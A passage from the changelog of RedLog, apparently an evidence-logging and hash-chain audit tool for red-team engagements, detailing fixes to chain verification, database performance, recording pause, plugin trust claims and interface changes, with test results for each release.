could tell it was not a fresh regression. The deferred note assumed a corrupted
row.

### What it actually was

`JSON.stringify` serialises in **insertion order**. Commit `33a2c86` built the
hash from the event literal itself:

```js
const event = { …, targetId, data, prevHash, createdAt }
sha256(JSON.stringify({ ...event, hash: undefined, prevHash }))
```

so `prevHash` sits **before** `createdAt`. `buildHashShapes` reconstructs that
era as `{ ...v01, prevHash }`, which appends it **after**. Same fields, same
values, different bytes, different hash. `f1f7c70` then appended `monotonicNs`
and `ntpOffsetMs` to the same literal, producing a second ordering with the
same property.

Every row written between `33a2c86` and the move to `canonicalStringify`
verifies under those orderings and no other — which is a substantial slice of
any project from that week.

Two shapes added, `v0.2-inline` and `v0.6-inline`. Ordering only matters for
the `JSON.stringify` shapes; `canonicalStringify` sorts keys, which is exactly
why it was adopted in v0.6.88.

### How it was found

By re-deriving the shape from the commit that wrote the row, rather than
guessing at corruption. Reconstructing `33a2c86`'s literal and re-hashing the
flagged row reproduced the stored digest exactly, where the current `v0.2`
shape differs from the first byte.

Verified against a real 28,338-event operator project:

| | before | after |
|---|---|---|
| `verifyChainFull` | stops at row **108** | **ok, 28,338 walked** |
| rows unexplained by any shape | 28,231 | **0** |

A second, 131,833-event project was already clean — it postdates
`canonicalStringify` — and stays clean.

### Regression cover

`test/hash-shapes.test.ts` pins the real row's digest and asserts the key
ORDER of each shape. A refactor that tidies the field order in
`buildHashShapes` would silently un-verify years of chains while every object
stayed deep-equal, so an ordering assertion is the only thing that catches it.
The test also asserts that the current `v0.2` shape does *not* match the row —
both orderings were written, so both are needed, and the distinction must not
be simplified away.

### Tested

- 494/494 unit (+4).
- 41/41 E2E, 1 skipped.

## v0.11.2 — 2026-08-10

**"I can't tell what I typed and what came back" — answered.** This closes the
original complaint that started `docs/timeline-io-visibility.md`, with the
transcript view (T5), the exchange folding (T4) and detail bodies for the two
sources that had none (T6).

### 1. Transcript — the Timeline read vertically

A new sidebar entry beside Timeline. Same events, same redaction masking, same
per-project scoping — laid out as a scrollable narrative instead of a forensic
track: one exchange per block, input above output.

The Timeline answers *when did this happen and what did it cause*. It is the
right shape for that and stays unchanged. It is the wrong shape for *what did I
type and what came back*, which is the question an operator asks when writing
an engagement up — and answering it meant clicking dots one at a time.

**Exchanges are folded (T4).** A `tool_call` and its `tool_result` are one
block, not two rows; likewise an HTTP request and its response. The pairing
rules mirror what the Timeline already knows — `tool_use_id` for agent turns,
`flow_id` for HTTP. Six events in the test render as four exchanges.

**Absence is stated, not implied.** A block whose output was never captured
says so, and says which kind of absence: `output not captured` (external shell,
no `redlog-run`), `not bracketed` (built-in session RedLog could not match to a
span), `recorded — N of session capture` (on disk, replay it on the Timeline),
`no response recorded` (a request whose response never arrived). This is the
same principle as `recording_paused` explaining a gap in the track: a blank
must never be ambiguous between "nothing happened" and "we did not look".

**Copy as Markdown** exports what is currently filtered. This is the one
report-adjacent thing RedLog can offer without becoming a reporting tool,
because it is a verbatim transcript and not an assessment — `docs/README.md`
still puts report writing downstream, and nothing here interprets, scores or
diffs.

### 2. Detail bodies for scanner and browser events (T6)

mitmproxy has been sending request params and a 2 KB `response_preview` all
along, and CDP has been sending console messages with stack traces. Neither had
a detail component, so the only way to read any of it was the raw-JSON toggle:
unformatted, redaction-masked, in a 120px box. Both now render like shell and
agent events do, and `ScannerDetail` distinguishes a body mitmproxy chose not
to store from one it never could (a non-textual content type).

### 3. ⌘9 is pinned to Settings

The shortcut list was `[...sidebar, 'settings']`, which worked while the
sidebar held eight entries. Transcript made it nine, so the list ran to ten —
and `parseInt(e.key)` only reaches 9, so **Settings silently lost its shortcut**
to whatever sat in ninth place. Settings is pinned separately in the sidebar
and documented as ⌘9 in the `?` sheet, so it keeps the slot; the sidebar takes
1..8 and the ninth entry has no number, which the operator controls by
reordering. The cheatsheet lists it explicitly now rather than inheriting it
from the concatenation.

### On the `io_ref` sidecar (T1)

Still unbuilt, and this release establishes it was never the blocker. Every
source already persists what it captures — the built-in terminal into `.cast`
(referenced from the chain since v0.9.6), `redlog-run` into inline streams,
mitmproxy into `response_preview`, agents into `full` / `output`. The sidecar
would raise those caps; it would not make anything visible that is not visible
now. Worth doing when a cap is the actual complaint, not before.

### Tested

- 489/489 unit.
- **41/41 E2E** (+1): the transcript folds a tool call with its result and an
  HTTP request with its response into single exchanges, renders a response body
  that previously had no UI at all, and labels uncaptured output as such.

## v0.11.1 — 2026-08-10

**A chain verify no longer locks out capture; the Timeline stops rendering
offscreen nodes; the HUD's expanded panel stops wrapping.**

### 1. A full chain verify blocked every captured event (AUDIT P1-1)

`verifyChainFullAsync` yields with `setImmediate` between chunks so the UI keeps
painting — but better-sqlite3's iterator holds its connection open across those
yields, and the library refuses `.run()` on a connection with a live iterator:

```
Error: This database connection is busy executing a query
```

So for the tens of seconds a large chain takes, **every capture write failed**:
REST returned 500, the shell hook spooled to `~/.redlog/pending/`,
capture-health went dark. Reproduced with 40 inserts against a 6000-row walk —
the first one threw.

The code comment argued this was safe "as long as no interleaving statement is
issued against the same DB". Background capture is exactly an interleaving
statement; the premise was wrong, not the reasoning. The walk now runs on its
own read-only connection, which WAL allows to proceed alongside the writer.

### 2. Timeline renders only what is near the viewport

Every cluster across the whole track was in the DOM regardless of where the
operator was looking. At max zoom the track is 12000px behind a ~1200px window,
so roughly 90% of the nodes existed only to be scrolled past — each an
absolutely-positioned div with a child, and dimmed ones stay in the tree at
opacity 0.15 rather than leaving it.

`x` is already computed in the clusters memo, so windowing is a numeric filter
over an array — far cheaper than the DOM it removes. The buffer is one viewport
either side, which is what keeps nodes from popping in during a drag.

Measured on a 13200px track: **400 nodes → 50**. Verified discriminating —
disabling the filter puts all 400 back and the new E2E fails.

### 3. HUD: the expanded panel's label column now scales with its text

The detail grid used a hard-coded 70px label column while its labels render at
`fs(11)`. At scale 1 "Last check" sat exactly on the boundary and wrapped to
two lines; at 1.25 and 1.5 every label wrapped. Present since the original
commit — not a regression, but it looked like one. The column is now `px(78)`,
tied to the same factor as the type, like the rest of the panel.

The keep-open toggle also goes back to a compact icon. Spelling out "KEEP OPEN"
made it the widest control in the row and squeezed the two mark buttons that
are the reason the row exists — v0.9.3 gave MARK the full width for good
reason. The label lives in the tooltip; the filled/hollow square and the border
colour carry the state. The two mark buttons go from 145px to 181px each.

### Tested

- 489/489 unit (+1): `test/chain-concurrency.test.ts` fires inserts *inside* a
  6000-row walk's iterator lifetime and asserts they land.
- 40/40 E2E (+2): the virtualisation node count, and HUD labels staying on one
  line at every scale the Settings UI offers.

## v0.11.0 — 2026-08-10

**No document in this repo now describes a security control that does not
exist.** That was the whole of this release. `docs/AUDIT-2026-08-08.md` had six
findings in its trust-model tier; every one is closed — either the control was
built, or the claim was corrected.

For a tool whose value proposition is "you can verify I am not lying to you", a
threat model that overstates its own defences is a defect of the same class as
a bug, and arguably worse: a bug fails visibly.

### 1. The registry index is untrusted, and now says so (P1-4)

`PLUGIN_MARKETPLACE.md` claimed *"`index.json` mutations without a valid
signature are rejected"*. They never were — there is no root key to check
against, `plugins.redlog.dev` was never registered, and TLS only proves the
bytes came from whoever holds the domain, which is exactly who an attacker
would need to be.

The real trust boundary was always one step later and does work: each tarball's
Ed25519 signature, verified against a key the **operator** pinned, with
privileged plugins refused outright without one. So the fix is to make the
index's status explicit rather than to build a lock for a door that does not
exist:

- **"Trust all suggested publishers" is gone.** That button was the actual
  hole: whoever controlled the index could advertise their own key, have it
  pinned in one click, and thereafter sign privileged plugins that passed every
  remaining check. Trust is now per-publisher.
- **The key fingerprint is shown next to each Trust button** — the string the
  operator is meant to compare against the publisher's own channel. It is
  computed in main from `publisher-trust.ts`, so it is byte-identical to what
  the trust store displays rather than a second implementation free to drift.
- **The unregistered default registry URL is gone.** A registry is a supply
  chain; there is no honest default to pick on the operator's behalf.

### 2. Revocations are a local blocklist, and are now called that (P1-5)

The docs described signed revocations arriving over the network and flipping
affected plugins to `needs-consent`. Nothing ever fetched them. Without a root
of trust that mechanism cannot be built honestly anyway — a fetched revocation
list is only as trustworthy as whoever served it, and a compromised publisher
will not revoke itself. `revocations.json` is documented as what it always was:
a blocklist the operator maintains.

### 3. `tailers` no longer runs before consent (P1-3)

`tailers` is in `PRIVILEGED_KEYS` — it makes RedLog `require()` plugin-supplied
code — but it was reached through `applyContributions`, which runs for anything
not `error`/`disabled`. The trust gate only guarded `host.start()`, so a plugin
sitting at `needs-consent` or `hash-changed` had its tailer module executed **in
the main process**, before the operator agreed to anything and with no
capability limits.

Latent, because a separate rule rejects non-bundled tailers. Both gates now
stay: bundled-only (third-party tailer isolation is still unbuilt — `parseUnit`
runs per transcript line and does synchronous fs I/O, which the per-call
`utilityProcess` model cannot absorb), **and** the trust check, because "we
shipped it" is not "the operator consented to this exact content".

### 4. Capture hook scripts are covered by the content hash (P2-1)

`codeFilesOf()` returned only `PRIVILEGED_KEYS`, so a 🟢 plugin's
`capture[].hookFile` sat outside the pinned hash — and that file is a shell
script the operator sources into their own `~/.zshrc`, which then runs on every
command they type. Its contents could change on an update with no hash change
and therefore no re-consent: precisely what content-hash pinning exists to
prevent, on the file with the broadest execution reach in the plugin model.
`collectFileRefs` already listed it for path-safety checks, so the omission was
in the hashing, not the parsing.

### 5. `vps-deploy.sh` refuses the primary token (P1-6)

It defaulted to pushing `~/.redlog/api-token` — the **primary** operator token,
which can create and revoke operators, rotate tokens, export the full evidence
bundle and read every loot row — to a red-team VPS, the most exposed asset in
an engagement. It also broke silently, since the primary token is rewritten on
every app start. It now refuses, and prints the `redlog-cli operators add`
command to mint a secondary.

### 6. The share Worker verifies uploaded bytes (P2-3)

`putBytes` wrote the request body into R2 under a sha256 key without checking
that the content hashed to it — the key was a label, not a claim. A comment
said the SHA was "re-verified on the next read", but that path only ran when R2
happened to hold a checksum, and the client never sent one. R2's own checksum
enforcement now does the comparison server-side, and a mismatch returns a
distinct error so an operator sees "corrupted or tampered with" rather than a
generic storage failure.

`CLOUD_SHARE_BUNDLE.md` separately claimed the Worker rejected bundles whose
sanitize counts disagreed with the manifest. It does not parse `bundle.json` at
all; the client-side review gate is the whole of that defence, and the doc now
says so.

### Tested

- 488/488 unit (+3): `tierOf` classifies a tailer contribution as privileged,
  and `needs-consent` / `hash-changed` plugins are refused before the
  `require()`.
- 38/38 E2E, 1 skipped. The marketplace publisher flow now also asserts the
  banner renders a real 16-byte fingerprint.

## v0.9.10 — 2026-08-10

**Settings reorganised; the three untested modules that touch evidence now have
tests.**

### 1. Ten Settings tabs down to eight

The tab strip had grown by accretion — a tab per feature, in the order the
features shipped. Reordered around the question the operator is asking:

> identity → what gets recorded → what's in bounds → exposure → display →
> external tools → retention → extensions

Two merges:

- **AI Agents → Capture.** The AI transcript tailer is a passive capture source
  exactly like the clipboard, the file watcher and the process monitor — all of
  which already lived in Capture. On its own it was a top-level tab holding
  three checkboxes, which made it look like a subsystem rather than one source
  among several. (Same reasoning that moved it onto the Capture Health card in
  v0.9.7.)
- **Marketplace → Plugins, as a sub-tab.** "What do I have" and "where do I get
  more" are one task, and an operator installing something moves between them
  constantly. Two of eight top-level slots for one task was the wrong trade.

### 2. Tests for the three modules that touch evidence

`docs/AUDIT-2026-08-08.md` §4 flagged these: *"One sends data to an external
SOC, the other deletes evidence from disk"* — and neither had a single test.
Nor did the bundle exporter, which produces the artefact an operator hands to a
client.

**`retention` (7 tests)** — keeps everything when `keepDays` is 0; prunes only
past the window; **writes one audit event per deletion**, so a reviewer finding
a missing `.cast` finds the row explaining it rather than an unexplained gap;
sweeps each directory against its own window; ignores files it does not own;
no-ops without an operator id.

**`deconfliction` (12 tests)** — runs a real HTTP server and asserts what
actually leaves the machine: only configured agent types and subtypes; the
event body withheld unless `includeData` is set (the test plants a secret in
`data` and asserts it is absent from the wire); the HMAC computed over the
exact bytes sent, including the `sha256=` prefix that is part of the wire
contract; batching; and that quitting mid-batch flushes rather than drops.

**`bundle-export` (10 tests)** — every file listed in the manifest exists and
matches its recorded sha256 and byte count; `manifest.sha256` covers
`manifest.json` exactly; `events.jsonl` is parseable line-by-line in insertion
order; the verifier and its OS wrapper ship with the bundle; agent transcripts
are **excluded by default** and included only on explicit opt-in; operator
token hashes never appear.

### 3. E2E updated for the merged tabs

`marketplace-flow.spec.ts` clicked a top-level Marketplace tab that no longer
exists. It now goes through Plugins first, via a named helper so the next tab
change has one place to fix.

### Tested

- **485/485 unit** (+29).
- 39/39 E2E, 1 skipped.

## v0.9.9 — 2026-08-10

**Profiled against a real 131k-event engagement.** v0.9.8 measured a synthetic
50k-row database; this round used a copy of an actual operator project — 131,833
events, 245 MB on disk, 151 MB of it in the `data` column, and **99.95% of the
rows are `agent`** (AI transcript turns, where `tool_result` averages 3.8 KB and
peaks at 107 KB). Row *count* was never the thing that mattered; total *bytes*
was, and a transcript-heavy project gets there two orders of magnitude sooner
than the earlier "fine until 1M rows" note assumed.

| Path | Before | After |
|---|---|---|
| `verifyRandomSample(100)` — every project open | **3,741 ms** | **8.9 ms** |
| `verifyRandomSample(50)` — every 5 minutes | **1,774 ms** | **5.8 ms** |
| `verifyLatestAnchor` | 141 ms | 2.9 ms |
| `computeChainHead` | 43 ms | 2.8 ms |

### 1. An OR that could not use an index — a 2-second freeze, four times an hour

The chain sample looks up each sampled row's predecessor:

```sql
WHERE created_at < ? OR (created_at = ? AND rowid < ?)
ORDER BY created_at DESC, rowid DESC LIMIT 1
```

`EXPLAIN QUERY PLAN` reports `SEARCH events USING INDEX idx_events_created_at`
for this, which is why it never looked suspicious. But SQLite cannot drive a
single index scan from an OR across two different predicates, and the fallback
reads the events table — which means paging in the entire `data` column.
**39.5 ms per lookup, one per sampled row.**

The row-value form is semantically identical and takes **0.6 ms for all 100**:

```sql
WHERE (created_at, rowid) < (?, ?)
```

That one query was the whole of `verifyRandomSample`. It runs synchronously on
the main process at every project open and on a 5-minute timer, so the app
froze for ~2 seconds four times an hour, indefinitely, on any engagement of
this size.

### 2. `ORDER BY RANDOM()` materialised every row

Sampling planned as `SCAN events | USE TEMP B-TREE FOR ORDER BY` — a random
key assigned to all 131k rows and the lot sorted, forcing the full `data`
column through the sort. Rowids are dense (the `no_delete_events` trigger
makes DELETE impossible), so the sample now draws random integers in
`[MIN(rowid), MAX(rowid)]` and fetches by primary key. When the request covers
the whole range it takes every rowid instead of drawing — coupon-collector
misses would otherwise verify fewer rows than exist, silently.

### 3. The sample verified hashes eagerly; the full walk had not since v0.7.1

`verifyRandomSample` built all six historical hash shapes into an array and
*then* called `.some()` on it, so every row paid five wasted SHA-256 passes
over its full body — any modern chain matches the first shape. `verifyRowHash`
has short-circuited newest-first since v0.7.1; only this path was left behind.
Both now share it.

### 4. Two more scans of the 151 MB data column

- `COUNT(*) WHERE hash IS NOT NULL` (the tail of `computeChainHead`) planned as
  a bare `SCAN`. A partial index — `ON events(created_at) WHERE hash IS NOT
  NULL` — lets the count walk index pages instead. 43 ms → 2.8 ms.
- `computeChainHead(maxEvents)` loaded the first N rows into an array to read
  its last element and length: 131k rows materialised to answer a question
  about one of them. Now `LIMIT 1 OFFSET N-1`.

### Note on method

Every one of these looked fine in the query plan or in a synthetic benchmark.
The OR in particular reported an index search and still degraded into a table
read. What found them was profiling the individual statements against a copy of
a real database, timing them in isolation, and being willing to discard two
wrong hypotheses (large `created_at` tie groups; eager hashing) before
measuring the one that mattered.

### Tested

- 456/456 unit (+2). `test/query-plans.test.ts` now also pins the prev-row
  lookup and the chain-head count. These regress *silently* — the query stays
  correct and only gets slow — so a plan assertion is the only thing that
  catches them.
- 38/38 E2E, 1 skipped.

## v0.9.8 — 2026-08-09

**Performance: profiled, then fixed.** Measured on a 50k-event database before
touching anything — the two worst offenders were not where the earlier audit
guessed, and one of them was catastrophic.

| Path | Before | After |
|---|---|---|
| `insertEvent` (steady state, per event) | **16.5 ms** | **0.107 ms** |
| Seeding 50k events | 143.6 s | 3.2 s |
| `getCaptureHealth` (repeat calls) | 23.4 ms | ~0 ms (cached) |
| `getCaptureHealth` (uncached) | 23.4 ms | 11.9 ms |
| Timeline `/` filter, 8 keystrokes at 100k events | 532 ms | 72 ms |

### 1. The dedup window was sorting the whole table, on every insert

`insertEvent` looks back 2 seconds for a duplicate command. The query
(`agent_type IN ('shell','agent') AND timestamp >= ? ORDER BY timestamp DESC
LIMIT 20`) planned as:

```
SEARCH events USING INDEX idx_events_type (agent_type=?) | USE TEMP B-TREE FOR ORDER BY
```

Neither single-column index could serve both halves, so SQLite took every
`shell` row — 43k of them at this size — and sorted them in a temp B-tree to
find twenty. **2.8 ms per insert, and it grows with the table.** At 200
events/s (a running scan) that alone is more than three seconds of
main-process work per second of capture; the app cannot keep up, and every
capture path is synchronous.

A composite `(agent_type, timestamp DESC)` index makes the ordering come from
the index. The dedup query drops from 2.805 ms to 0.019 ms, and `insertEvent`
end-to-end from 2.714 ms to 0.121 ms. The index is created by the same
idempotent DDL as the others, so existing projects pick it up on open.

For the record, the rest of `insertEvent` was never the problem: Ed25519
signing is 0.009 ms and the prev-hash lookup 0.002 ms.

### 2. Capture health ran eleven full-bucket scans per call

Each source probe was `SELECT MAX(timestamp) ... WHERE agent_type = ? AND
json_extract(data,'$.source') = ?`. `MAX()` is an aggregate, so SQLite must
visit every row matching the WHERE clause — and no index can serve a
`json_extract`, so each of the eleven probes scanned the whole agent_type
bucket. 23 ms per call, on the Dashboard poll, the StatusBar, every REST
`/api/status`, and every agent calling `redlog_status` (which the shipped
skill tells them to do at session start).

Two changes: `ORDER BY timestamp DESC LIMIT 1` instead of `MAX()`, so the new
composite index walks newest-first and stops at the first row satisfying the
json filter; and a 750 ms result cache, since the reading is a freshness
readout with a ten-minute active window.

The cache is dropped by everything that changes what the readout says —
`configureCaptureHealth`, `noteDbError` / `clearDbError`, `noteSampleBroken` /
`noteSampleOk` / `clearSampleBroken`, `invalidateHooksCache`. A broken chain
sample has to go dark on the very next read, not after the TTL; the
chain-sampling tests caught this when the first version of the cache lacked
the invalidation.

### 3. Timeline filtering rebuilt every haystack on every keystroke

`filterMatches` listed `filterQuery` in its deps, so each character retyped a
nine-element array, joined it, lowercased it and called `eventTitle()` (which
slices and replaces) — for every event. The searchable text now builds once
per event set, and the query is debounced 120 ms. Typing "nmap -sV" over 100k
events: 532 ms → 72 ms of scanning, and the debounce collapses eight scans
into one.

### Not changed

`verifyChainFull` (648 ms at 50k) and the 100k-row export path (181 ms) are
still synchronous on the main process. Both are deliberate operator actions
rather than hot paths, and the chain walk has an open concurrency defect
(AUDIT P1-1) that should be fixed in the same pass. Filed, not rushed.

### Tested

- 454/454 unit (+4): `test/query-plans.test.ts` asserts both hot queries are
  index-served and free of temp B-tree sorts — they stay correct when they
  regress, so only a plan assertion catches it. Plus cache-invalidation
  coverage.
- 38/38 E2E, 1 skipped.

## v0.9.7 — 2026-08-09

**Capture Health becomes an exception report; HUD marking splits in two.**
Also reverts the v0.9.4 HUD geometry changes — the operator reported the
v0.9.3 HUD as correct and the changed one as wrong, so the three files went
back to v0.9.3 verbatim.

### 1. Capture Health lists problems, not inventory

The card listed all eight sources unconditionally, so the healthy majority
pushed the one broken row out of a glance — the opposite of what an "is
anything wrong?" panel is for. It now shows **only sources that are switched
on but not delivering**. Everything working, and everything deliberately off,
collapses into one line. An "all sources (N)" toggle opens the full inventory.

### 2. Installed and enabled are separate axes

`installed` (the hook exists on disk) and `enabled` (the operator switched it
on) were conflated into one `installed?: boolean`, so "never turned on" and
"turned on but silent" both rendered as grey `idle`. `SourceState` gains
`off`, and each source now carries `hookId` (what an install button acts on)
and `configPath` (what a switch writes). The inventory view offers both
controls per row.

A switched-off source no longer drags the verdict to `partial`. Disabling e.g.
the process monitor after it had once fed used to pin the verdict there
forever, which trains operators to ignore the one indicator that is supposed
to mean something.

### 3. Three missing sources, one retired, one merged

- **Added**: AI agent transcripts, clipboard, screenshots. None of them
  appeared on this card — an operator could have the transcript tailer off and
  the readout would still say healthy.
- **Removed**: the `claude-code` row. That hook was retired in v0.7.3 (the
  script is a no-op stub, its `detectHooks()` entry is commented out), so it
  could never report `installed` and rendered as a permanent idle with an
  Install button that did nothing. The tailer row covers Claude Code — and
  Codex, and OpenCode — properly.
- **Merged**: DNS folds into the mitmproxy row. Both are served by
  `hooks/mitmproxy-addon.py`, switched by how `mitmdump` is run; two rows
  implied two things to install and left one permanently grey for everyone not
  running DNS mode.

### 4. HUD: quick mark vs detailed mark

The single MARK button called `overlay:quickMark`, which opens the marker
dialog **in the main window** — raising and focusing it. That is the one thing
a heads-up display should not do to note that something just happened. Now two:

- **quick** (`⚡`) — a timestamped marker straight into the chain via a new
  `overlay:instantMark`. No dialog, no focus change; the button confirms
  inline with `✓ marked` for 1.4s, since with nothing else moving on screen
  there would otherwise be no sign it worked. Marked `source: 'hud-instant'`
  so a reviewer knows a bare title is intentional rather than lost.
- **detail** (`✎`) — the previous behaviour, for when a title, notes and
  severity are worth stopping for.

The pin toggle beside them always controlled the 8-second auto-collapse, but a
bare `📌` did not say so. Relabelled `▢ / ▣ keep open`.

### 5. HUD geometry reverted to v0.9.3

v0.9.4 changed three things about HUD sizing and position: width measured from
`scrollWidth` instead of a formula, the compact bar's `overflow: hidden`
removed, and the x-anchoring made symmetric. The operator reported the result
as "opens expanded, wrong size, wrong position", and confirmed v0.9.3 was
correct. `OverlayApp.tsx`, `windows.ts` and the `overlay:autosize` handler are
back to v0.9.3 **verbatim** (diff-verified).

`e2e/hud-overlay.spec.ts` now *characterises* v0.9.3's actual behaviour rather
than asserting what a fix ought to do — including the leftward x drift on
repeated width changes, which is real but is filed in
`docs/AUDIT-2026-08-08.md` instead of patched blind. The scale-1.5 clipping
test is skipped for the same reason: its fix was part of the reverted change.

### 6. macOS install instructions were wrong

The README said to right-click → **Open** past Gatekeeper. Since macOS 15 that
path is gone for unsigned apps, and the quarantine flag surfaces as
*"RedLog is damaged and can't be opened"* — which reads as a corrupt download
rather than a security prompt. Builds are ad-hoc signed and not notarised, so
the working instruction is `xattr -dr com.apple.quarantine /Applications/RedLog.app`,
or **Privacy & Security ▸ Open Anyway**.

### Tested

- 450/450 unit (+3: the off-state, the verdict no longer tipping on a disabled
  source, and DNS folding into mitmproxy).
- 38/38 E2E, 1 skipped (see §5).
- i18n 794/794 aligned.

## v0.9.6 — 2026-08-09

**Command output becomes visible, and the runtime-`require` family is
closed.** First half of the I/O visibility plan in
`docs/timeline-io-visibility.md` (T2 + T3): the built-in terminal's output was
already on disk in the session `.cast`, but nothing in the UI said so until
you clicked through to a replay, and nothing distinguished "this command
printed nothing" from "we never captured what it printed".

### 1. `command_end` brackets its own output (T2)

A built-in-terminal `command_end` now carries:

```jsonc
"io": { "stream": "cast", "ref": "<session>.cast", "off": 8421, "len": 166 }
```

The offsets come from the live cast write position, which `terminal-manager`
already maintains for its size cap — so stamping is **O(1)**. Re-deriving the
window by time on each `command_end` would re-stream a growing prefix of the
file, which is O(n²) over a session.

`readCastRange()` reads that span directly, and the replay endpoint prefers it
over the time-window path (kept as the fallback for pre-v0.9.6 events and for
pairs that could not be bracketed). Reading a command's output is now O(len)
instead of O(file prefix).

The v0.6.47 invariant holds: **bytes stay on disk, only the reference enters
the chain.** In-chain stdout was reverted back then because TUI output blew
past any cap and the hash ended up covering ANSI noise; an `io` reference
reintroduces none of that. A test asserts the stamped object contains no
output text.

### 2. Absence is stated, not implied (T3)

The detail panel for a shell `command_end` used to show exit code and duration
and nothing else, so an empty panel meant either outcome. It now says which:

- **output recorded** — with the size of the session-capture span, and the
  replay control below to read it;
- **output not captured** — external shells record the command only; the note
  names `redlog-run` as the wrapper that does capture streams;
- **output not bracketed** — a built-in session RedLog could not match to a
  span, pointing at the full-session replay instead.

On the track itself, a single shell `command_end` dot gains a 3px notch when
output was recorded (amber when nothing was captured) and a red outline when
`exit_code != 0`. Two channels of texture rather than more colour — the 18
lane hues are already past what is reliably distinguishable.

**What this deliberately does not claim.** `io.len` is the span of the *cast*,
not the size of the output: it includes the shell's echo of the command line
and the JSON framing of each write, so even `true` brackets ~150 B.
Distinguishing "printed nothing" from "printed something" would mean reading
and ANSI-stripping the range on every command — exactly the per-command cost
the byte offsets exist to avoid. The label says "of session capture" and the
real output byte count appears once the replay is expanded. An earlier draft
of this release showed it as an output size and claimed a "no output" state
that could never fire; both were wrong and were removed before shipping.

### 3. The runtime-`require` family is closed (AUDIT P0-7)

v0.9.4 P0-4 treated `require('../core/retention')` as a one-off. It was not.
Four more turned up in the same shape — surviving verbatim into `out/main/`,
resolving against directories rollup never emitted, each swallowed by a
surrounding `catch`:

| Site | What silently stopped working |
|---|---|
| `chain-anchor.ts` | **`system.anchor_failed` was never written.** `audit-trail.md` lists it as a drift signal, and v0.6.88 added it precisely because "an anchor failure is currently silent". In every packaged build, it stayed silent. |
| `terminal-manager.ts` | **`recoverOrphanSessions()` always returned 0.** A terminal killed by a crash never got its synthetic `session_end`, so its cast SHA-256 was never recorded and the timeline showed a session that never closed. |
| `cloud-share.ts` | `projectDirSafe()` always fell to its `~/.redlog/no-project` fallback, so share previews counted screenshots and casts in the wrong directory. |

Unit tests could not catch any of it — they import modules directly and never
touch the bundle. `test/cloud-share.test.ts` had gone further and *encoded*
the bug: a comment explained that `require()` bypasses `vi.mock`, so its
fixtures were written into the fallback path. That test now asserts the
correct behaviour.

`test/bundle-requires.test.ts` scans `out/main/` and fails on any relative
`require()` that does not resolve to an emitted file — closing the family
rather than the instances.

### Tested

- 447/447 unit (+1: bundle integrity).
- **37/37 E2E** (+4): `e2e/command-io.spec.ts` drives a real pty — spawns a
  built-in terminal, runs a command, and asserts the `io` range lands in the
  chain, carries no output text, and resolves back to the command's own output
  through the replay endpoint. None of it is reachable from a unit test: the
  offsets come from a live cast write position.
- i18n 771/771 aligned.

## v0.9.5 — 2026-08-09

**Pause now means "do not record".** The README promised that daily/hobby work
stayed off the audit chain while paused. It did not: the gate lived only on
`eventBus.publish()`, so a paused RedLog still wrote every event into the DB
and the hash chain — it muted the UI feed and the deconfliction webhook and
nothing else. `RELEASE_CHECKLIST` §17 has said "no new events added while
paused" the whole time, so this closes the gap between the documented
behaviour and the code rather than changing the design.

### 1. The gate moved to the single write point

`insertEvent()` now drops passive capture while paused. Enforcing it there
instead of at the 46 call sites across 14 files means no capture source can
forget — the shell preexec hook and the mitmproxy addon are covered without
either of them learning about recording state, which also removes the race
between "hook checks" and "row is written".

Two lanes stay exempt (`PAUSE_EXEMPT_AGENT_TYPES`):

- **`system`** — RedLog's audit trail about itself and the environment
  (`recording_paused`, `config_changed`, `sanitized`, `secret_revealed`,
  `*_pruned`, `ip_transition`, `opsec_state_changed`, `chain_sample_broken`).
  Dropping these would leave the pause itself unrecorded, and a gap in the
  timeline has to stay explainable — that is the premise the whole log rests
  on.
- **`marker`** — someone deliberately writing something down is not passive
  capture. This generalises the rule `screenshot-agent` already applied
  locally: ambient triggers pause, an explicit manual capture does not.

`bypassPause` covers the remaining deliberate action, the manual screenshot
trigger, which otherwise wrote its JPEG to disk and then silently lost its
event row.

### 2. `POST /api/events` bails before any derivation — and answers 2xx

Two things had to be true at the HTTP surface:

- **Bail early.** The `insertEvent` gate alone would drop the main row, but the
  shell normalisation ahead of it emits its own — `scope_violation`, `loot`,
  `pivot`, `cleanup`, `file_transfer`. A `scope_violation` names the target
  host of a command that was never recorded, so the paused request now returns
  before any detector runs.
- **Answer 200, not an error.** `shell-preexec-hook.sh` posts with `curl -sf`,
  which treats any non-2xx as failure and spools the payload to
  `~/.redlog/pending/` — and RedLog replays that spool on the next project
  open. A refusal that looked like a failure would have put every paused
  command into the chain minutes later. The paused path returns
  `200 {ok, recording: false, skipped}`.

### 3. Pause/resume rows name their origin

Pause genuinely suppressing capture makes `redlog_recording` sharper than it
was: an agent holding a token can now go properly dark, and the two bracketing
`system` rows are the only trace. `eventBus.pause()` / `.resume()` take a
source, and the event carries it — `ui` (operator at the keyboard, button /
tray / ⌘.), `api` (redlog-cli or another local REST client) or `mcp` (an agent
calling the tool). With the `operator_id` already resolved from the token, a
reviewer can now tell an operator pausing from an agent pausing itself.

The capability is kept rather than removed: an operator may legitimately want
an agent to pause capture. Making it attributable is the right control here,
not making it impossible.

### 4. Docs

`README.md` replaces the "two-gate hook privacy" bullet, which described only
the Claude Code path, with an accurate pair: what pause covers now (every
source, at the write point), and the fact that cwd exclusion applies to the
transcript tailer and the Codex / OpenCode hooks but **not** to the shell
preexec hook. `audit-trail.md` and `event-schema.md` document the `source`
field and the exempt lanes.

### Tested

- **446/446 unit** (+7): `test/pause-gate.test.ts` covers the exempt set, the
  13 passive lanes being dropped, `bypassPause`, and prev_hash linking
  straight through a pause — dropping rows before insert never breaks the
  chain.
- **33/33 E2E** (+7): `e2e/recording-pause.spec.ts` drives the real HTTP
  surface — the 200-not-error contract with an empty spool dir, no derived
  events leaking a paused command's host or credentials, `system` + `marker`
  still landing, and all three toggle origins (`ui` / `api` / `mcp`) labelled
  correctly.
- A/B verified: disabling the gate makes the paused POST answer 201 instead of
  200-skipped, and the test catches it.

## v0.9.4 — 2026-08-09

**Five P0 defects, every one of them silent.** A full-tree review produced a
standing audit (`docs/AUDIT-2026-08-08.md`); this release clears its P0 tier.
The through-line is that none of these were reachable from the unit suite —
two live in the main-process startup path, one only reproduces against the
bundled build, and three are renderer geometry. Every fix ships with an E2E
test that was confirmed to fail against the pre-fix build.

### 1. Agent-tailer path exclusions never applied (P0-1)

`src/main/index.ts` called `os.homedir()` while importing only
`{ homedir } from 'os'` — no `os` binding exists, so the call threw
`ReferenceError` on every `startProject()` and a bare `catch {}` swallowed it.
`excludedPaths` / `watchPaths` were therefore permanently `[]`: every path an
operator excluded in Settings ▸ Integrations was ignored by the transcript
tailer. The shell hook reads the same file itself, which is why the feature
looked alive for several releases.

